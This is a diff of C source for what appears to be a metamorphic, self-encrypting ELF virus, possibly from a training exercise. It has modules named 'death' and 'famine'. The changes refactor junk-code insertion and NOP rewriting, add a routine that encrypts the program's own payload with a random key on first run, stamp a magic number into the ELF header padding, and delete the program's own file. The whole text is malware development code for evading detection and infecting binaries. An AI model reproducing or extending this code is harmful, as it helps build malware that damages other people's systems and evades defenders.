@@ -6,6 +6,7 @@
 #include "utils.h"
 #include "death.h"
 #include "data.h"
+#include "famine.h"
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
@@ -137,6 +138,7 @@ static void patch_jmp(uint8_t *nop, uint8_t *instr_off, uint8_t instr_len, int8_
 
 #define LEA_FLAG (1 << 0)
 #define CALL_FLAG (1 << 1)
+#define JMP_FLAG (1 << 2)
 
 static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
@@ -331,46 +333,54 @@ void mutate(void) {
 	replace_nop((uint8_t *)start, g_junk_offsets); JUNK;
 }
 
-/* this is used only for the first run of the main prog (like fill_offsets) */
-static uint8_t* write_self_pos(uint8_t *entry) {
+#define G_JUNK_OFF (uintptr_t)&g_junk_offsets - (uintptr_t)&_start
+#define G_NB_JUNK_OFF (uintptr_t)&g_nb_junk - (uintptr_t)&_start
 
-	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
-	uint8_t *junk = (uint8_t *)(entry + junk_pos);
+/* this and encrypt self is used only for the first run of the main prog (like fill_offsets) */
+static void write_self_pos(uint8_t *entry) {
+
+	uint8_t *junk = (uint8_t *)(entry + G_JUNK_OFF);
 	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
 
-	uintptr_t junk_size = (uintptr_t)&g_nb_junk - (uintptr_t)&_start;
-	uint8_t *size = (uint8_t *)(entry + junk_size);
-	ft_memcpy(size, &g_nb_junk, sizeof(g_nb_junk));
+	*(uint8_t *)(entry + G_NB_JUNK_OFF) = g_nb_junk;
+}
+
+#define G_IS_ENCRYPTED_OFF (uintptr_t)&g_is_encrypted - (uintptr_t)&_start
+#define G_KEY_OFF (uintptr_t)&g_key - (uintptr_t)&_start
+
+static uint8_t* encrypt_self(uint8_t *entry) {
 
 	/* encrypt self */
-	uintptr_t key_pos = (uintptr_t)&g_key - (uintptr_t)&_start;
-	uint8_t *key = (uint8_t *)(entry + key_pos);
-	getrandom(g_key, KEY_SIZE, 0);
-	ft_memcpy(key, g_key, KEY_SIZE);
+	//uintptr_t key_pos = (uintptr_t)&g_key - (uintptr_t)&_start;
+	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
+	getrandom(key, KEY_SIZE, 0);
 
 	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
 
-	uintptr_t is_encrypted = (uintptr_t)&g_is_encrypted - (uintptr_t)&_start;
-	uint8_t *enc = (uint8_t *)(entry + is_encrypted);
-	ft_memcpy(enc, (const void *)&(bool){true}, sizeof(bool));
+	//uintptr_t is_encrypted = (uintptr_t)&g_is_encrypted - (uintptr_t)&_start;
+	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
+	//ft_memcpy(enc, (const void *)&(bool){true}, sizeof(bool));
+	*enc = true; JUNK;
+
 
 	return key;
 }
 
-int death(int start_offset, uint8_t *key, file_t *file, bool is_encrypted) {
+int death(saved_vars_t *vars, file_t *file) {
 
 	uint8_t *self = (uint8_t *)file->view.data; JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
 
-	uint8_t *entry = self + start_offset;
+	uint8_t *entry = self + vars->start_offset;
 
-	if (is_encrypted) {
-		replace_nop_encrypt(entry, g_junk_offsets, key);
+	if (vars->is_encrypted) {
+		replace_nop_encrypt(entry, g_junk_offsets, vars->key);
 	} else {
-		uint8_t* new_key = write_self_pos(entry);
+		write_self_pos(entry);
+		uint8_t *new_key = encrypt_self(entry);
 		replace_nop_encrypt(entry, g_junk_offsets, new_key);
-		//replace_nop(entry, g_junk_offsets);
+		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
 	}
 
 	if (unlink(self_name) == -1) {
